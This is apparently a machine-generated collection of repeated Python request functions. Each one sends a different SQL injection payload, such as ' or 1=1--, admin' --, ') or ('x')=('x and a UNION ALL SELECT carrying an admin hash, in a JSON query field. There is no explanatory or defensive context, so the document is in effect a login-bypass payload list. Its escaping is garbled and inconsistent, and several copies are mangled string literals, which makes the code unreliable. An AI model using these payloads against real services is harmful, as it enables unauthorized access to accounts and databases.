'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22*\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x22\\x22-\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x22\\x22 \\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x22\\x22&\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x22\\x22^\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x22\\x22*\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or true--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or true--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or true--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or true--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or true--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 'x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or ('x')=('x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22')) or (('x'))=(('x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or \\x22x\\x22=\\x22x\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or \x28\\x22x\\x22\x29=\x28\\x22x\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29\x29 or \x28\x28\\x22x\\x22\x29\x29=\x28\x28\\x22x\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' #\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin'/*\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' or '1'='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' or '1'='1'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' or '1'='1'#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' or '1'='1'/*\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin'or 1=1 or ''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' or 1=1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' or 1=1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' or 1=1#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin' or 1=1/*\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin') or ('1'='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin') or ('1'='1'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin') or ('1'='1'#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin') or ('1'='1'/*\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin') or '1'='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin') or '1'='1'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin') or '1'='1'#\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22admin') or '1'='1'/*\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x221234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22 #\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22 or \\x221\\x22=\\x221\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22 or \\x221\\x22=\\x221\\x22--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22 or \\x221\\x22=\\x221\\x22#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22 or \\x221\\x22=\\x221\\x22/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22or 1=1 or \\x22\\x22=\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22 or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22 or 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22 or 1=1#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22 or 1=1/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22\x29 or \x28\\x221\\x22=\\x221\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22\x29 or \x28\\x221\\x22=\\x221\\x22--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22\x29 or \x28\\x221\\x22=\\x221\\x22#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22\x29 or \x28\\x221\\x22=\\x221\\x22/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22\x29 or \\x221\\x22=\\x221\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22\x29 or \\x221\\x22=\\x221\\x22--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22\x29 or \\x221\\x22=\\x221\\x22#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22admin\\x22\x29 or \\x221\\x22=\\x221\\x22/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
